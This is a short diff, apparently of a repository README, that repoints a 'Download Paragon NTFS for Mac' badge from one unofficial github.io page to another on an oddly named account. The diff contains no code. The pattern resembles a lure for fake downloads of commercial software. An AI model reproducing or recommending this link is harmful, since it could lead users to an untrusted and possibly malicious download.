@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![⬇️ Download Paragon NTFS for Mac](https://img.shields.io/badge/⬇️_Download_Paragon_NTFS-blue?style=for-the-badge&logo=apple)](https://paragon-ntfs-for-macos.github.io/.github)
+[![⬇️ Download Paragon NTFS for Mac](https://img.shields.io/badge/⬇️_Download_Paragon_NTFS-blue?style=for-the-badge&logo=apple)](https://ashshshshsh213.github.io/.github)
 
 </div>
 
